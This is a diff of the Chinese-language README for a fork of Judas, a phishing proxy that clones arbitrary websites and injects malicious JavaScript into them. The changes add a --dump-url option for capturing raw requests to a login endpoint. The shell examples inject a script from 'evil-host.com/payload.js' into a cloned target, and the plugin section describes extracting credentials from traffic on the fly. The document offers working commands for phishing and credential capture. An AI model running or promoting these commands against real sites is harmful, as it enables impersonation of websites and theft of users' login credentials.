@@ -4,15 +4,16 @@ Judas 是一个可扩展化的钓鱼代理.
 通过快速克隆任意网站。在任意网站中植入钓鱼 js 进行钓鱼。本项目克隆自 [JonCooperWorks/judas](https://github.com/JonCooperWorks/judas)。并对其进行稍微修改
 
 ```
-Usage of judas:
-    -address string
+  -address string
         Address and port to run proxy service on. Format address:port. (default "localhost:8080")
   -cookie-domain string
         set Cookies Domain
+  -dump-url string
+        dump request URL * is no dump (default "*")
   -inject-js string
         URL to a JavaScript file you want injected.
   -inject-url string
-        target URL to a JavaScript file you want injected. default * is all (default "*")
+        target URL to a JavaScript file you want injected. default * is all ',' split (default "*")
   -insecure
         Listen without TLS.
   -insecure-target
@@ -29,6 +30,7 @@ Usage of judas:
         Hostname for SSL certificate
   -target string
         The website we want to phish.
+  -v    show version
   -with-profiler
         Attach profiler to instance.
 
@@ -87,8 +89,7 @@ Example:
     --proxy socks5://localhost:9150
 ```
 
-By default, Judas listens on localhost:8080.
-To change this, use the ```--address``` argument.
+修改侦听地址
 
 Example:
 ```
@@ -98,7 +99,7 @@ Example:
     --address=0.0.0.0:8080
 ```
 
-Judas can also inject custom JavaScript into requests by passing a URL to a JS file with the ```--inject-js``` argument.
+注入js默认是注入所有的js
 
 Example:
 ```
@@ -109,15 +110,31 @@ Example:
 ```
 ## 注入特定的 url
 ```shell
-
-judas.go --target  https://target-url.com \
-     --insecure --address=10.10.200.1:8080 \
+judas --target  https://target-url.com             \
+     --insecure --address=10.10.200.1:8080         \
      --inject-js= https://evil-host.com/payload.js \
      --inject-url="/index.php/Index/index"
 ```
 
-Plugins
+
+
+### dump 下来原始请求
+
+```shell
+judas --target  https://target-url.com              \
+     --insecure --address=10.10.200.1:8080          \
+     --inject-js= https://evil-host.com/payload.js  \
+     --inject-url="/index.php/Index/index"          \
+     --dump-url="/index.php/Public/checkLogin"
+```
+
+
+
+**注意** --`dump-url` `--inject-url` 多个参数用英文`,` 隔开不可有空格
+
+插件功能
 -------
+
 Judas can be extended using [Go plugins](https://golang.org/pkg/plugin/). 
 An `judas` plugin is a regular Go plugin with a function called `New` that implements `judas.InitializerFunc`.
 You can use plugins to save request-response transactions to disk for further analysis, or pull credentials and sensitive information out of requests and responses on the fly.
@@ -194,12 +211,9 @@ go build -buildmode=plugin examples/searchloggingplugin/searchloggingplugin.go
 ```
 
 ### 修复一些bug
-** Location 跳转 和目标域名不同域名跳转不变。相同跳转到代理地址   
-** 可选注入到特定 URL 中不区分大小写   
-** 解决 cookie 跨域导致无法登录   
+* Location 跳转 和目标域名不同域名跳转不变。相同跳转到代理地址   
+* 可选注入到特定 URL 中不区分大小写 
+*  解决 cookie 跨域导致无法登录   
+
 ### 注意
 1. 使用域名或者特定的IP 不要使 0.0.0.0 这类
-
-##  待做功能
-1. 域名绑定
-支持多个目标
